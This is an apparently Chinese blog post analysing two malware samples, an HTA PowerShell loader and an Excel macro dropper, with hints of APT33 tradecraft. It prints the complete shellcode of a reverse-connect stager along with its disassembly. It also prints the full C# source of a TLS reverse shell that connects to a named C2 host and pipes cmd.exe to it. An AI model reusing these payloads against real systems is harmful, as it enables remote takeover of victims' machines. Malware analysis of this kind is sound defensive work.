
<!DOCTYPE html>
<html lang="zh-CN" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>两份样本分析记录总结 - RGDZ&#39;s blog</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="CTF PWN 恶意文件分析 编程 WEB,"> 
    <meta name="description" content="RGDZ&#39;s blog,两份样本分析记录总结前言:
此样本，大佬说有可能是假旗活动，暂时没法实锤是那组织，但值得一提是样本的手法和APT33的比较相似。

样本一:分析:
样本信息:




样本名称
文件大小
MD5

,"> 
    <meta name="author" content="RGDZ"> 
    <link rel="alternative" href="atom.xml" title="RGDZ&#39;s blog" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
    <link rel="stylesheet" href="/css/obsidian.css">
    <link rel="stylesheet" href="/css/ball-atom.min.css">
</head>


<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">RGDZ&#39;s blog</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://rgdz-gzu.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">两份样本分析记录总结</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" target="_blank" rel="noopener" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="#" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg);">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="/categories/样本分析"><b>「
                    </b>样本分析<b> 」</b></a>
                
                十二月 08, 2019
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/2019/12/08/%E4%B8%A4%E4%BB%BD%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95%E6%80%BB%E7%BB%93/" title="两份样本分析记录总结" class="">两份样本分析记录总结</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>文章字数</i>
                    16k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
                    14 mins.
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>阅读次数</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/APT/" rel="tag">APT</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/hta%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" rel="tag">hta恶意代码</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/office%E5%AE%8F%E4%BB%A3%E7%A0%81/" rel="tag">office宏代码</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" rel="tag">恶意代码分析</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h1 id="两份样本分析记录总结"><a href="#两份样本分析记录总结" class="headerlink" title="两份样本分析记录总结"></a>两份样本分析记录总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote>
<p>此样本，大佬说有可能是假旗活动，暂时没法实锤是那组织，但值得一提是样本的手法和APT33的比较相似。</p>
</blockquote>
<h2 id="样本一"><a href="#样本一" class="headerlink" title="样本一:"></a>样本一:</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><blockquote>
<p>样本信息:</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">样本名称</th>
<th align="center">文件大小</th>
<th align="center">MD5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Launcher (scrambled).hta</td>
<td align="center">14.41 KB</td>
<td align="center">85486b71ff7234205e0d18153ac0f7ed</td>
</tr>
</tbody></table>
<blockquote>
<p>该样本类型为hta，代码里面极有可能调用ActiveXObject对象来执行WScript.Shell<br><img src="./img/simple1/hta_code1.png" alt="hta_code"></p>
</blockquote>
<blockquote>
<p>补充:HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，</p>
</blockquote>
<blockquote>
<p>这个是uincode编码解一下，果然调用了WScript.Shell，下面还有一段是powershell的混淆<br><img src="./img/simple1/js_decode.png" alt="js_decode"></p>
</blockquote>
<blockquote>
<p>这里有个小技巧,我们UE修改一下代码<br><img src="./img/simple1/ue.png" alt="ue"></p>
</blockquote>
<blockquote>
<p>然后重新执行便可<br><img src="./img/simple1/hta_run.png" alt="hta_run"></p>
</blockquote>
<blockquote>
<p>很明显的base64,直接decode一下，注意decode后有这种情况:<br><img src="./img/simple1/base64_decode.png" alt="base64_decode"></p>
</blockquote>
<blockquote>
<p>我们直接将乱码字符删除掉就行，这个不影响,最后可以还原代码</p>
</blockquote>
<blockquote>
<p>稍微整理后的代码,可以看见很明显的开辟内存执行shellcode,这里也是ps1脚本核心执行流:<br><img src="./img/simple1/ps1_core.png" alt="ps1_core"></p>
</blockquote>
<blockquote>
<p>很明显的开辟内存执行shellcode</p>
</blockquote>
<blockquote>
<p>完整shellcode:</p>
</blockquote>
<blockquote>
<p>\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3</p>
</blockquote>
<blockquote>
<p>这里我们把是，shellcode丢OD里面可以看到汇编代码:</p>
</blockquote>
<pre><code class="gas">004E06D0 &gt;    FC            cld
004E06D1      E8 89000000   call    004E075F
004E06D6      60            pushad
004E06D7      89E5          mov     ebp, esp
004E06D9      31D2          xor     edx, edx
004E06DB      64:8B52 30    mov     edx, dword ptr fs:[edx+30]
004E06DF      8B52 0C       mov     edx, dword ptr [edx+C]
004E06E2      8B52 14       mov     edx, dword ptr [edx+14]
004E06E5      8B72 28       mov     esi, dword ptr [edx+28]
004E06E8      0FB74A 26     movzx   ecx, word ptr [edx+26]
004E06EC      31FF          xor     edi, edi
004E06EE      31C0          xor     eax, eax
004E06F0      AC            lods    byte ptr [esi]
004E06F1      3C 61         cmp     al, 61
004E06F3      7C 02         jl      short 004E06F7
004E06F5      2C 20         sub     al, 20
004E06F7      C1CF 0D       ror     edi, 0D
004E06FA      01C7          add     edi, eax
004E06FC    ^ E2 F0         loopd   short 004E06EE
004E06FE      52            push    edx
004E06FF      57            push    edi
004E0700      8B52 10       mov     edx, dword ptr [edx+10]
004E0703      8B42 3C       mov     eax, dword ptr [edx+3C]
004E0706      01D0          add     eax, edx
004E0708      8B40 78       mov     eax, dword ptr [eax+78]
004E070B      85C0          test    eax, eax
004E070D      74 4A         je      short 004E0759
004E070F      01D0          add     eax, edx
004E0711      50            push    eax
004E0712      8B48 18       mov     ecx, dword ptr [eax+18]
004E0715      8B58 20       mov     ebx, dword ptr [eax+20]
004E0718      01D3          add     ebx, edx
004E071A      E3 3C         jecxz   short 004E0758
004E071C      49            dec     ecx
004E071D      8B348B        mov     esi, dword ptr [ebx+ecx*4]
004E0720      01D6          add     esi, edx
004E0722      31FF          xor     edi, edi
004E0724      31C0          xor     eax, eax
004E0726      AC            lods    byte ptr [esi]
004E0727      C1CF 0D       ror     edi, 0D
004E072A      01C7          add     edi, eax
004E072C      38E0          cmp     al, ah
004E072E    ^ 75 F4         jnz     short 004E0724
004E0730      037D F8       add     edi, dword ptr [ebp-8]
004E0733      3B7D 24       cmp     edi, dword ptr [ebp+24]
004E0736    ^ 75 E2         jnz     short 004E071A
004E0738      58            pop     eax
004E0739      8B58 24       mov     ebx, dword ptr [eax+24]
004E073C      01D3          add     ebx, edx
004E073E      66:8B0C4B     mov     cx, word ptr [ebx+ecx*2]
004E0742      8B58 1C       mov     ebx, dword ptr [eax+1C]
004E0745      01D3          add     ebx, edx
004E0747      8B048B        mov     eax, dword ptr [ebx+ecx*4]
004E074A      01D0          add     eax, edx
004E074C      894424 24     mov     dword ptr [esp+24], eax
004E0750      5B            pop     ebx
004E0751      5B            pop     ebx
004E0752      61            popad
004E0753      59            pop     ecx
004E0754      5A            pop     edx
004E0755      51            push    ecx
004E0756      FFE0          jmp     eax
004E0758      58            pop     eax
004E0759      5F            pop     edi
004E075A      5A            pop     edx
004E075B      8B12          mov     edx, dword ptr [edx]
004E075D    ^ EB 86         jmp     short 004E06E5
004E075F      5D            pop     ebp
004E0760      68 33320000   push    3233
004E0765      68 7773325F   push    5F327377
004E076A      54            push    esp
004E076B      68 4C772607   push    726774C
004E0770      FFD5          call    ebp
004E0772      B8 90010000   mov     eax, 190
004E0777      29C4          sub     esp, eax
004E0779      54            push    esp
004E077A      50            push    eax
004E077B      68 29806B00   push    6B8029
004E0780      FFD5          call    ebp
004E0782      50            push    eax
004E0783      50            push    eax
004E0784      50            push    eax
004E0785      50            push    eax
004E0786      40            inc     eax
004E0787      50            push    eax
004E0788      40            inc     eax
004E0789      50            push    eax
004E078A      68 EA0FDFE0   push    E0DF0FEA
004E078F      FFD5          call    ebp
004E0791      97            xchg    eax, edi
004E0792      6A 05         push    5
004E0794      68 FFFEFDFC   push    FCFDFEFF
004E0799      68 020001BB   push    BB010002
004E079E      89E6          mov     esi, esp
004E07A0      6A 10         push    10
004E07A2      56            push    esi
004E07A3      57            push    edi
004E07A4      68 99A57461   push    6174A599
004E07A9      FFD5          call    ebp
004E07AB      85C0          test    eax, eax
004E07AD      74 0C         je      short 004E07BB
004E07AF      FF4E 08       dec     dword ptr [esi+8]
004E07B2    ^ 75 EC         jnz     short 004E07A0
004E07B4      68 F0B5A256   push    56A2B5F0
004E07B9      FFD5          call    ebp
004E07BB      6A 00         push    0
004E07BD      6A 04         push    4
004E07BF      56            push    esi
004E07C0      57            push    edi
004E07C1      68 02D9C85F   push    5FC8D902
004E07C6      FFD5          call    ebp
004E07C8      8B36          mov     esi, dword ptr [esi]
004E07CA      6A 40         push    40
004E07CC      68 00100000   push    1000
004E07D1      56            push    esi
004E07D2      6A 00         push    0
004E07D4      68 58A453E5   push    E553A458
004E07D9      FFD5          call    ebp
004E07DB      93            xchg    eax, ebx
004E07DC      53            push    ebx
004E07DD      6A 00         push    0
004E07DF      56            push    esi
004E07E0      53            push    ebx
004E07E1      57            push    edi
004E07E2      68 02D9C85F   push    5FC8D902
004E07E7      FFD5          call    ebp
004E07E9      01C3          add     ebx, eax
004E07EB      29C6          sub     esi, eax
004E07ED      85F6          test    esi, esi
004E07EF    ^ 75 EC         jnz     short 004E07DD
004E07F1      C3            retn</code></pre>
<blockquote>
<p>此shellcode，和cs生成的shellcode,大致相同，我手动调了一下，但是win上的逆向我太菜了，没看懂。</p>
</blockquote>
<blockquote>
<p>此样本的特点就是调用powershell,来开辟内存执行shellcode,这是核心。<br>其攻击流程，any,run上给出的进程图基本相同，但shellcode我没调动，就没继续跟了，如同所示:<br><img src="./img/simple1/%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt="流程图"></p>
</blockquote>
<blockquote>
<p>此样本的手法,还是有不错的免杀效果:<br><img src="./img/simple1/virustotal.png" alt="virustotal1"></p>
</blockquote>
<h2 id="样本二"><a href="#样本二" class="headerlink" title="样本二:"></a>样本二:</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h3><blockquote>
<p>样本信息:</p>
</blockquote>
<table>
<thead>
<tr>
<th align="center">样本名称</th>
<th align="center">文件大小</th>
<th align="center">MD5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">2.2.CS_revs-MWC-MP.xls</td>
<td align="center">134.00 Kb</td>
<td align="center">43f1424da62a50e01db5f3acd86bfa00</td>
</tr>
</tbody></table>
<blockquote>
<p>此样本第一步利用宏代码来释放载荷<br><img src="./img/simple2/vbs_code1.png" alt="vbs_code1"></p>
</blockquote>
<blockquote>
<p>此函数主要做hex解码工作<br><img src="./img/simple2/hex_code.png" alt="hex_code"></p>
</blockquote>
<blockquote>
<p>这是vbs核心执行流,在这里通过上面的hex字符串解码出一个c#代码文件,和xml模板文件<br><img src="./img/simple2/vbs_core.png" alt="vbs_core"></p>
</blockquote>
<blockquote>
<p>很明显此处调用了<code>Microsoft.Workflow.Compiler.exe</code>来动态编译载荷,我们将上面这个base64的字符解码出来,可以得到两个文件:notes.txt,important.txt</p>
</blockquote>
<blockquote>
<p>其中notes.txt是c#代码,如下:</p>
</blockquote>
<pre><code class="csharp">using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Security.Authentication;
using System.Workflow.Activities;


public class Ovoda : SequentialWorkflowActivity
{
    static StreamWriter streamWriter;
    public Ovoda()
    {
        string host = &quot;sts.gtabnk.com&quot;;
        int port = Int32.Parse(&quot;443&quot;);
        string envvar = &quot;cmd.exe&quot;;
        string arguments = &quot; &quot;; 
        int xorkey = Int32.Parse(&quot;00&quot;);


        string envvar1 = &quot;&quot;;
        for (int i = 0; i &lt; envvar.Length; i++)
        {
            char c = (char)(envvar[i] ^ xorkey);
            envvar1 += c;
        }

        //Console.WriteLine(&quot;executing {0} {3} and redirecting stdout / stderr to {1}:{2}&quot;, envvar1, host, port, arguments);

        using (TcpClient client = new TcpClient(host, port))
        {
            using (SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null))
            {
                stream.AuthenticateAsClient(host, null, SslProtocols.Tls12, false);
                using (StreamReader rdr = new StreamReader(stream))
                {
                    streamWriter = new StreamWriter(stream);
                    StringBuilder strInput = new StringBuilder();
                    StringBuilder veliyepo = new StringBuilder();
                    veliyepo.Append(&quot;exit&quot;);
                    Process p = new Process();
                    //p.StartInfo.FileName = System.Environment.GetEnvironmentVariable(envvar1); 
                    p.StartInfo.FileName = envvar1;
                    p.StartInfo.Arguments = arguments;
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                    p.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
                    p.Start();
                    p.BeginOutputReadLine();
                    p.BeginErrorReadLine();

                    while (true)
                    {
                        strInput.Append(rdr.ReadLine());
                        //Console.WriteLine(&quot;Excuting: {0}&quot;, strInput);
                        //if (strInput == veliyepo)
                        //{
                        //    p.StandardInput.WriteLine(&quot;exit&quot;);
                        //    break;
                        //}
                        p.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                }
            }
        }
    }

    public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
    {
        // 100% correct way of validating the cert.
        return true;
    }

    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();
        if (!String.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception) { }
        }
    }

    private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();
        if (!String.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception) { }
        }
    }

}</code></pre>
<blockquote>
<p>很明显,里面已经暴露c2地址,<br>important.txt就是一份xml文档,用于编译<br>关于MWC动态编译代码过免杀可以参考这篇文章:<a href="https://www.freebuf.com/articles/system/182501.html" target="_blank" rel="noopener">如何利用Microsoft.Workflow.Comiler.exe执行未签名的任意代码</a><br>这里提一句:Microsoft.Workflow.Comiler.exe这个程序需要4.0以上的.NET才有</p>
</blockquote>
<blockquote>
<p>实际上这份样本有个有意思的地方<br><img src="./img/simple2/vmcheck.png" alt="vmcheck"></p>
</blockquote>
<blockquote>
<p>这是一个虚拟机检测,导致any.run上并没有给出进程图</p>
</blockquote>
<blockquote>
<p>此样本的手法主要就是利用宏代码,Hex_Encode,base64隐藏代码,这个手法也很向APT33,此手法在virustotal上检测现在也仅有12家报毒,火绒现在已杀<br><img src="./img/simple2/virustotal.png" alt="virustotal2"></p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><blockquote>
<p>此次分析,针对两个样本,主要是脚本代码类型的分析,文中也许有很多地方没有讲到,而是直接上修复或整理后的代码,不得不说恶意代码分析,在脚本类型这一块主要就是混淆,高强度的混淆对分析人员来说是一个很大的挑战,需要代码功底足够扎实,因为不仅仅一种语言,各种各样的脚本,但多是大同小异,所以扎实代码功底可以让我们应付起来要轻松一些,样本一的shellcode,有时间我还会在继续调试追踪,看看能不能分析出来,win32平台上的分析,我还是菜了很多</p>
</blockquote>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/statics/chun.mp3'></li>
                
                    
            </ul>
            
            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="/img/favicon.png" height=300 width=300></img>
                    <p>RGDZ</p>
                    <span>潜心习安全，莫忘初心。</span>
                    <dl>
                        <dd><a href="https://gitee.com/rgdz-gzu/" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">13 <p>文章</p></a></li>
                    <li><a href="/categories">7 <p>分类</p></a></li>
                    <li><a href="/tags">29 <p>标签</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>目录</h4>
                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#两份样本分析记录总结"><span class="toc-number">1.</span> <span class="toc-text">两份样本分析记录总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.1.</span> <span class="toc-text">前言:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#样本一"><span class="toc-number">1.2.</span> <span class="toc-text">样本一:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">1.2.1.</span> <span class="toc-text">分析:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#样本二"><span class="toc-number">1.3.</span> <span class="toc-text">样本二:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">分析:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.4.</span> <span class="toc-text">总结:</span></a></li></ol></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2020
        <span class="gradient-text">
            RGDZ
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/obsidian.js"></script>
<script src="/js/jquery.truncate.js"></script>
<script src="/js/search.js"></script>
<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/vb/vb.min.js"></script>



    <script src="/js/busuanzi.min.js"></script>
    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>


<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>







<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["潜心习安全，莫忘初心。", "Concentrate on safety, do not forget the original intention."],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
